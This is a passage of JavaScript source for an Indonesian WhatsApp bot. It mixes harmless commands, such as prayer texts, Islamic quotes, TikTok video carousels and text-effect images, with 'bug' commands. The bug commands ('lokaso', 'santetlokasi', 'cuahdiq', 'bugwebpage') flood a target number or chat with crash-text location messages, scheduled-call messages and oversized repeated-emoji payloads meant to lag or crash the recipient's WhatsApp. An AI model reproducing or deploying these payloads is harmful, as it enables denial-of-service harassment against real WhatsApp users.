      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    reply(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
if (banned.includes(m.sender)) {
    return;
    }
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    reply(`${caption}`)

}
break
//=========================================\\   
case 'niatsholat': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'vidgalau': case 'videogalau': {
if (banned.includes(m.sender)) {
    return;
    }
reply(mess.wait)

    function formatViews(views) {
        let form = views.toString();
        let formatv;
        if (form.length > 6) {
            formatv = (views / 1000000).toFixed(1) + 'M';
        } else if (form.length > 4) {
            formatv = (views / 1000).toFixed(2) + 'K';
        } else {
            formatv = form;
        }
        return formatv;
    }

    async function createVideo(url) {
        const { videoMessage } = await generateWAMessageContent({ video: { url } }, { upload: KhaerulZx.waUploadToServer });
        return videoMessage;
    }

    function shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1)); // Perbaikan di sini
            [array[i], array[j]] = [array[j], array[i]];
        }
    }

    let push = [];
    let { data } = await axios.get(`https://widipe.com/tiktoksearch?text=galau`);
    let res = data.result.data;
    shuffleArray(res); // Mengacak array
    let ult = res.splice(0, 3); // Jumlah video yang ingin dikirim
    let i = 1;

    for (let lucuy of ult) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Title:* ${lucuy.title}\n*Author:* ${lucuy.author.nickname}`
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `👁️: ${formatViews(lucuy.play_count)}\n❤️: ${formatViews(lucuy.digg_count)}\n💬: ${formatViews(lucuy.comment_count)}\n➡️: ${formatViews(lucuy.share_count)}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '',
                hasMediaAttachment: true,
                videoMessage: await createVideo(lucuy.play)
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    const bot = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Ini dia kak *video galau* nya`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'By: Finsii',
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [...push]
                    })
                })
            }
        }
    }, { quoted: m });

    await KhaerulZx.relayMessage(m.chat, bot.message, { messageId: bot.key.id });
}
break;
case 'quotesislami': {
if (banned.includes(m.sender)) {
    return;
    }
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    reply(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
if (banned.includes(m.sender)) {
    return;
    }
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    reply(`${caption}`)
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (banned.includes(m.sender)) {
    return;
    }
if (!q) return reply(`Example : ${prefix+command} KhaerulZx`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
KhaerulZx.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'cuahdiq': {
if (banned.includes(m.sender)) {
    return;
    }
const cap = `${ngazap(prefix)}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
KhaerulZx.relayMessage(m.chat, { scheduledCallCreationMessage: { callType: "2", scheduledTimestampMs: Date.now, title: cap}},{ messageId: scheduledCallCreationMessage })

}
break
//===============================================


case "lokaso":{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*khusus Premium*')
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
					"degreesLatitude": 37.3898048400879,
"name": `${virtex7(prefix)}`,
					"degreesLongitude": -122.08141326904297,
					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:m})
KhaerulZx.relayMessage(from, locationMessage.message, { messageId: locationMessage.key.id })
}
}

//===============================================
case "santetlokasi":{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*khusus Premium*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214181312`)
Pshsisj = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
					"degreesLatitude": 37.3898048400879,
"name": `${virtex7}`,
					"degreesLongitude": -122.08141326904297,
					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:m})
KhaerulZx.relayMessage(Pshsisj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
m.reply(`Sukses Mengirim Bug`)
}
break
//===============================================

//===============================================
case "bugwebpage":
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem) return reply('Khusud Prem Yang Mau Buy Prem Ke Owner')
        for (i = 0; i < 10; i++) {
          const ikale = {
            remoteJid: ''
          };
          const ikale2 = {
            'fromMe': [],
            'participant': "0@s.whatsapp.net",
            ...(m.chat ? ikale : {})
          };
          const ikuakle = {
            url: "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
            fileSha256: "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
            fileEncSha256: "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
            mediaKey: "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
            mimetype: "image/webp",
            height: 0x28,
            width: 0x28,
            directPath: "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
            fileLength: "99999999",
            mediaKeyTimestamp: "16572901099967",
            isAnimated: []
          };
          const ajuan = {
            stickerMessage: ikuakle
          };
          const batuo = {
            key: ikale2,
            message: ajuan
          };
          const jajane = {
            quoted: batuo
          };
          KhaerulZx.sendMessage(m.chat, {
            'text': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY ALBYS" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
                'mediaType': 0x1
              }
            }
          }, jajane);
          await sleep(2000);
          const pencu = {
            quoted: batuo
          };
          KhaerulZx.sendMessage(m.chat, {
            'text': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY ALBYS" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
                'mediaType': 0x1
              }
            }
          }, pencu);
          await sleep(2000);
          const pencu1 = {
            quoted: batuo
          };
          KhaerulZx.sendMessage(m.chat, {
            'text': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY ALBYS" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
                'mediaType': 0x1
              }
            }
          }, pencu1);
          await sleep(2000);
          const tilol = {
            quoted: batuo
          };
          KhaerulZx.sendMessage(m.chat, {
            'text': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
            'contextInfo': {
              'externalAdReply': {
